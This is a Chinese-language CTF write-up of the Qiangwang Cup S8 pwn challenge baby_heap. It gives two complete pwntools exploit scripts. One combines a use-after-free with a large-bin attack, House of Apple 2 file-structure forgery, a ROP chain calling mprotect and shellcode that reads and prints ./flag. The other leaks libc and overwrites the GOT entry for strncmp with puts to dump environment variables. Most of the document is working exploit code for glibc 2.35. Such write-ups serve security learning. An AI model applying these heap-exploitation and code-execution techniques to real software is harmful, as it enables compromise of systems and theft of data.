---
title: 强网杯S8 - Pwn 个人题解
published: true
---

| 目录跳转: |
|--------|
| [PWN: baby_heap 通解 - 附Exp](#pwn-baby_heap-通解) |
| [PWN: baby_heap 特解 - 附Exp](#pwn-baby_heap-特解) |
| [PWN: expect_number - 未更新](#pwn-expect_number) |


# [](#header-3)pwn baby_heap 通解

这个题很适合当 large bin 大堆溢出打 House of Apple 2 链的板子题. 但是如果真这样做，会绕很多弯路，最优解应该是利用到 Secret Shop 修改 got 表  
通解没有利用到 Secret Shop，而是直接用的 large chunk 来打  

这个程序在堆已经被 释放 后依然可以向该堆写入内容，因此有了可乘之机. 首先在某个已经释放的堆里填充 House of Apple 2 通用板子

```py
# 伪造 struct _IO_FILE_complete_plus
struct_file = flat({
	# struct _IO_FILE_complete -> _IO_FILE
	0:      0,  							# file._flag
	0x18:   p64(leave_ret_c),				# file._IO_read_base
	0x28:   p64(libc.symbols['_IO_list_all'] - 0x20),	# 写 IO_list_all - 0x20 的地址至 bk_size，下一次分配小堆元素时就会分配到这里
	0x48: 	p64(orw_addr),  				# file._IO_save_base
	0x88:   p64(lock),                 		# file._lock
	# struct _IO_FILE_complete
	0xa0:   p64(widedata_addr),             # file._wide_data 
	# struct
	0xd8:   p64(wfile),						# file._vtable
}, filler=b'\0')

# 伪造 struct _IO_wide_data
struct_widedata  = flat({
	0xe0:	p64(widedata_addr + 0xe8),		# _IO_wide_data._IO_read_ptr
	0x150:	p64(magic_gadget),				# 
}, filler=b'\0')

```

然后再在板子后面接上 orw，此处先调用 mprotect，修改 `heap_base_addr` ~ `heap_base_addr + 0x10000` 为rwx 后，跳到精心构造的 shellcode 执行. 该 shellcode 打开 `./flag` read 后将其标准输出

```py
orw =  b'./flag\x00\x00'
orw += p64(rdx_r12_c) + p64(0) + p64(start_addr - 0x10)
# 调用 mprotect, 修改 heap_base_addr ~ heap_base_addr + 0x10000 为rwx
orw += p64(rdi_c) + p64(heap_base_addr)
orw += p64(rsi_c) + p64(0x10000) 
orw += p64(rdx_r12_c) + p64(0x7) * 2
orw += p64(libc.symbols['mprotect'])
orw += p64(shell_addr)
''' long syscall(SYS_openat2, int dirfd, const char *pathname, struct open_how *how, size_t size); '''
orw += asm(shellcraft.openat2(-100, orw_addr, orw_addr + 0x1000, 0x18))
''' ssize_t read(int fd, void buf[.count], size_t count); '''
orw += asm(shellcraft.read(3, heap_base_addr + 0x10000, 0x50))
''' ssize_t write(int fd, const void buf[.count], size_t count); '''
''' write to stdout 1 '''
orw += asm(shellcraft.write(1, heap_base_addr + 0x10000, 0x50))
orw += asm(shellcraft.exit(0))

payload = struct_file + struct_widedata + orw
# offset a large chunk header
edit_com(1, payload[16:])
```

填充完毕后，刷新大小排序的链表，并使得该 bin 的 bk_nextsize 重新指向 `_IO_list_all - 0x20` 的地址. 此时 `_IO_list_all - 0x20` 的 fd_nextsize 理论上也会指向该堆，那么 `_IO_list_all` 此时的地址即为该 bin

![qwb](/image/qwbs8/0.png)  

![qwb](/image/qwbs8/1.png)  

观察一看，确实如此. 后续直接随便调用 IO 即可触发. 如下所示读取了 `./flag` 并且输出了 flag{...}

![qwb](/image/qwbs8/2.png)  


### [](#header-3)EXP


```py
#by leeya_bug

from pwn import *
import time
import os

SLEEP_TIME = 0.2

context.os = 'linux'
context.log_level = "debug"
x64_32 = True
context.arch = 'amd64' if x64_32 else 'i386'

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug():
	subprocess.Popen(["qterminal", "-e", f'bash -c "pwndbg -p {p.pid}" '])
	p.interactive()
	
#------------- 基本配置 -------------

def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')

add_com(0x548)
add_com(0x548)
add_com(0x538)
del_com(1)
add_com(0x558)
del_com(3)

content = show_com(1)
libc_addr 	= u64(content[:8]) - 0x21b120
libc.address 	= libc_addr
heap_addr 	= u64(content[16:24])
heap_base_addr 	= heap_addr - 0x1950

leave_ret_c 	= next(libc.search(asm('leave;ret;')))
'''call [[[rdi + 0x48] + 0x18] + 0x28]; move rdi, [[rdi + 0x48] + 0x10]'''
magic_gadget 	= next(libc.search(asm('mov rbp, qword ptr [rdi + 0x48];mov rax, qword ptr [rbp + 0x18]')))
rdi_c 		= next(libc.search(asm('pop rdi;ret;')))
rsi_c 		= next(libc.search(asm('pop rsi;ret;')))
rdx_r12_c 	= next(libc.search(asm('pop rdx;pop r12;ret;')))
lock 		= libc_addr + 0x3ed8b0
wfile 		= libc_addr + 0x216F40

start_addr 	= heap_addr
widedata_addr 	= start_addr + 0xe0
orw_addr 	= start_addr + 0xe0 + 0xe8 + 0x70
shell_addr	= start_addr + 0xe0 + 0xe8 + 0x70 + 0x68

# 伪造 struct _IO_FILE_complete_plus
struct_file = flat({
	# struct _IO_FILE_complete -> _IO_FILE
	0:      0,  										# file._flag
	0x18:   p64(leave_ret_c),							# file._IO_read_base
	0x28:   p64(libc.symbols['_IO_list_all'] - 0x20),	# file._IO_write_ptr
	0x48: 	p64(orw_addr),  							# file._IO_save_base
	0x88:   p64(lock),                 					# file._lock
	# struct _IO_FILE_complete
	0xa0:   p64(widedata_addr),                  		# file._wide_data 
	# struct
	0xd8:   p64(wfile),									# file._vtable
}, filler=b'\0')

# 伪造 struct _IO_wide_data
struct_widedata  = flat({
	0xe0:	p64(widedata_addr + 0xe8),					# _IO_wide_data._IO_read_ptr
	0x150:	p64(magic_gadget),							# 
}, filler=b'\0')

orw =  b'./flag\x00\x00'
orw += p64(rdx_r12_c) + p64(0) + p64(start_addr - 0x10)
# 调用 mprotect, 修改 heap_base_addr ~ heap_base_addr + 0x10000 为rwx
orw += p64(rdi_c) + p64(heap_base_addr)
orw += p64(rsi_c) + p64(0x10000)
orw += p64(rdx_r12_c) + p64(0x7) * 2
orw += p64(libc.symbols['mprotect'])
orw += p64(shell_addr)
''' long syscall(SYS_openat2, int dirfd, const char *pathname, struct open_how *how, size_t size); '''
orw += asm(shellcraft.openat2(-100, orw_addr, orw_addr + 0x1000, 0x18))
''' ssize_t read(int fd, void buf[.count], size_t count); '''
orw += asm(shellcraft.read(3, heap_base_addr + 0x10000, 0x50))
''' ssize_t write(int fd, const void buf[.count], size_t count); '''
''' write to stdout 1 '''
orw += asm(shellcraft.write(1, heap_base_addr + 0x10000, 0x50))
orw += asm(shellcraft.exit(0))

payload = struct_file + struct_widedata + orw
# offset a large chunk header
edit_com(1, payload[16:])

add_com(0x568)
add_com(0x538)

#print(f'addr {hex(shell_addr)}')
#debug()

show_com(2)

```

# [](#header-3)pwn baby_heap 特解

由于 getenv、setenv 在遍历所有环境变量时，调用了 strncmp 函数，在这里获取 libc 地址后，直接通过 Secret Shop 修改 got 表中 strncmp 函数的值为 put 函数即可打印出所有环境变量.

### [](#header-3)EXP


```py
#by leeya_bug

from pwn import *
import time

SLEEP_TIME = 0.2

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug():
	subprocess.Popen(["qterminal", "-e", f'bash -c "pwndbg -p {p.pid}" '])
	p.interactive()
	
#------------- 基本配置 -------------


def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')
	
def print_env(chose: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'5')
	p.sendlineafter(b'sad !', str(chose).encode())
	return p.recvuntil(b'Menu:')
	
def secret(target_addr: bytes, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'6')
	p.sendafter(b'target addr', target_addr)
	time.sleep(SLEEP_TIME)
	p.send(content)
	
add_com(1300)
add_com(1300)
del_com(1)
content = show_com(1)

libc_addr = u64(content[:8]) - 0x21ace0
libc.address = libc_addr
secret(p64(libc.got['strncmp']), p64(libc.symbols['puts']))

print(print_env(2))
```

# [](#header-3)pwn expect_number

未更新